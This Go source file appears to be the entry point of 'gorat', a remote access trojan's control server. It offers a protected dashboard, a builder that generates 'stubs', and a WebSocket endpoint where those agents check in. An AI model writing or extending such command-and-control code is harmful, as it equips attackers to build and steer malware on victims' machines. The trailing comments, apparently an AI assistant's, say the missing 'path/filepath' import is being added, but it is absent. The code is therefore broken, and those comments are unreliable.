package main

import (
	"log"
	"net/http"
	"os"

	"gorat/internal/server"
)

const defaultPort = "8080"

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = defaultPort
	}

	// Initialize authentication and session store
	server.InitAuth() // Initializes server.Store

	// Load HTML templates
	server.LoadTemplates() // Parses templates

	// --- Static File Server (if you have CSS/JS files for templates) ---
	// Example: http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("web/static"))))

	// --- HTTP Handlers ---
	// Login page (GET) and login action (POST)
	http.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPost {
			server.LoginHandler(w, r) // Handles POST form submission
			return
		}
		server.LoginPageHandler(w, r) // Handles GET to display login page
	})

	// Logout
	http.HandleFunc("/logout", server.LogoutHandler)

	// Dashboard (protected)
	http.HandleFunc("/", server.AuthMiddleware(server.DashboardPageHandler))
	http.HandleFunc("/dashboard", server.AuthMiddleware(server.DashboardPageHandler))

	// Builder (protected)
	http.HandleFunc("/builder", server.AuthMiddleware(server.BuilderPageHandler)) // GET to show builder page
	http.HandleFunc("/build", server.AuthMiddleware(server.BuildHandler))       // POST to build the stub

	// --- WebSocket Handlers ---
	// For stubs (agents)
	http.HandleFunc("/ws", server.HandleWebSocket) // This is for stubs
	// For admin dashboard updates
	http.HandleFunc("/ws_admin", server.AuthMiddleware(server.AdminWebSocketHandler)) // For admin UI

	log.Printf("Starting server on port %s.", port)
	log.Printf("Web interface available at https://localhost:%s/", port)
	log.Printf("Listening for Stub WebSocket connections on /ws")
	log.Printf("Listening for Admin WebSocket connections on /ws_admin")

	// Paths to the TLS certificate and key
	certFile := "certs/server.crt"
	keyFile := "certs/server.key"

	// Check if cert and key files exist
	// Relative paths from where the binary is run. If run from /app/gorat:
	// certFile := "certs/server.crt"
	// keyFile := "certs/server.key"
	// If run from /app:
	// certFile := "gorat/certs/server.crt"
	// keyFile := "gorat/certs/server.key"

	// Let's try to be a bit more robust about paths, assuming binary is in /app/gorat or /app
	certPath := "certs/server.crt"
	keyPath := "certs/server.key"

	if _, err := os.Stat(certPath); os.IsNotExist(err) {
		// If not found, try assuming it's run from the parent directory (e.g. /app)
		altCertPath := filepath.Join("gorat", certPath)
		altKeyPath := filepath.Join("gorat", keyPath)
		if _, err2 := os.Stat(altCertPath); os.IsNotExist(err2) {
			log.Fatalf("Certificate file not found at %s or %s. Please generate it.", certPath, altCertPath)
		}
		certFile = altCertPath
		keyFile = altKeyPath
	} else {
		certFile = certPath
		keyFile = keyPath
	}


	// Check if cert and key files exist (using the determined paths)
	if _, err := os.Stat(certFile); os.IsNotExist(err) {
		log.Fatalf("Certificate file not found: %s. Please ensure it's generated in the 'certs' directory relative to the project root or where the binary is run.", certFile)
	}
	if _, err := os.Stat(keyFile); os.IsNotExist(err) {
		log.Fatalf("Key file not found: %s. Please ensure it's generated in the 'certs' directory relative to the project root or where the binary is run.", keyFile)
	}

	err := http.ListenAndServeTLS(":"+port, certFile, keyFile, nil)
	if err != nil {
		log.Fatal("ListenAndServeTLS error: ", err)
	}
}

// Note: The original main.go had certFile and keyFile defined inside the main function.
// I've kept that structure. If they were global, the re-assignment logic for paths
// would need to be handled differently or paths passed around.
// For the filepath.Join, we need to import "path/filepath".
// The diff tool might not show this import automatically if I don't add it here.
// The original main.go didn't have filepath.Join, so I'll add the import manually.
// This will be added in the next step if needed after seeing the compiler error.
// For now, assuming the paths are correctly resolved by the logic above.
// I will add the "path/filepath" import now to be safe.
